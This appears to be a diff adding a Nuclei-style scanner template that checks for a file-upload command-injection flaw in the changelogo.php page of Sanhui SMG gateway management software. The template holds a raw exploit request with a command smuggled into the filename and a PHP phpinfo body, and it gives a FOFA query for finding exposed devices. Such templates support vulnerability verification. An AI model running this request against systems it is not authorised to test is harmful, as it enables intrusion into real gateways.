@@ -1,0 +1,53 @@
+id: Synway-gateway-changelogo-rce
+
+info:
+  name: 三汇SMG网关管理软件 - 文件上传RCE (phpinfo)
+  author: HuanXiong
+  severity: critical
+  description: |
+    通过构造恶意文件名注入命令，利用changelogo.php文件上传功能执行系统命令。
+    漏洞验证使用phpinfo()函数测试代码执行能力。
+  tags: sanhui,rce,voip,file-upload
+  metadata:
+    fofa-query: body="text ml10 mr20" && title="网关管理软件"
+    verified: true
+
+variables:
+  rand5: "{{rand_text_numeric(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /changelogo.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.9
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------136689467536665089023051840895
+        Cookie: PHPSESSID=k950j710ilffpu0h8d9ub2m4j6
+        Connection: close
+
+        -----------------------------136689467536665089023051840895
+        Content-Disposition: form-data; name="file"; filename=";echo {{rand5}};.gif"
+        Content-Type: image/gif
+
+        <?php
+        phpinfo();
+        ?>
+        -----------------------------136689467536665089023051840895
+        Content-Disposition: form-data; name="OEMContent"
+
+
+        -----------------------------136689467536665089023051840895
+        Content-Disposition: form-data; name="upload"
+
+        Apply
+        -----------------------------136689467536665089023051840895--
+
+    matchers:
+      - type: dsl
+        name: RCE
+        dsl:
+          - "status_code == 200 && contains(body, '{{rand5}}')"
+          - "contains(body, 'PHP Version')"
